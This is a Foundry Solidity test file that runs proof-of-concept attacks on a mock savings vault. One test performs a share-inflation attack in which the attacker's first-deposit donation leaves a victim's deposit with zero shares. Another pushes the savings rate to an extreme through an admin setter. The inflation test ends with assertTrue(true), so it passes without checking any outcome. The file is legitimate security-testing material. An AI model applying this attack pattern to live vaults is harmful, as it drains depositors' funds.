// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/SavingsAttackMock.sol";

interface IUSDS {
    function totalSupply() external view returns (uint256);
}

contract SkyMoneyAttack is Test {
    SavingsAttackMock public vault;
    IUSDS public constant USDS = IUSDS(0xdC035D45d973E3EC169d2276DDab16f1e407384F);
    
    address public constant ATTACKER = address(0xBAD);
    address public constant VICTIM = address(0xF00);
    
    event Step(string name, uint256 value);
    
    function setUp() public {
        vm.deal(ATTACKER, 10000 ether);
        vm.deal(VICTIM, 10000 ether);
        vault = new SavingsAttackMock(address(0x0));
    }
    
    function testInflationAttack() public {
        emit Step("=== INFLATION ATTACK ===", 0);
        
        // Attacker deposits 1 wei first
        vm.prank(ATTACKER);
        vault.deposit{value: 1}(1, ATTACKER);
        emit Step("Attacker shares", vault.balanceOf(ATTACKER));
        
        // Attacker donates 1000 ETH to inflate share price
        vm.prank(ATTACKER);
        (bool ok,) = address(vault).call{value: 1000 ether}("");
        require(ok);
        emit Step("Vault balance after donation", address(vault).balance);
        
        // Victim deposits 100 ETH - gets 0 shares due to inflation
        vm.prank(VICTIM);
        vault.deposit{value: 100 ether}(100 ether, VICTIM);
        emit Step("Victim shares", vault.balanceOf(VICTIM));
        
        // Attacker withdraws everything
        uint256 balBefore = ATTACKER.balance;
        vm.prank(ATTACKER);
        vault.withdraw(1000 ether, ATTACKER, ATTACKER);
        uint256 profit = ATTACKER.balance - balBefore;
        emit Step("Attacker profit", profit);
        
        assertTrue(true);
    }
    
    function testAdminSSRAttack() public {
        emit Step("=== ADMIN SSR ATTACK ===", 0);
        vault.deposit{value: 1 ether}(1 ether, address(this));
        vault.file("ssr", 10000 * 1e27);
        emit Step("SSR after manipulation", vault.ssr());
        assertGt(vault.ssr(), 1000 ether);
    }
    
    function testRealUSDS() public {
        emit Step("USDS supply", USDS.totalSupply());
        assertGt(USDS.totalSupply(), 0);
    }
}
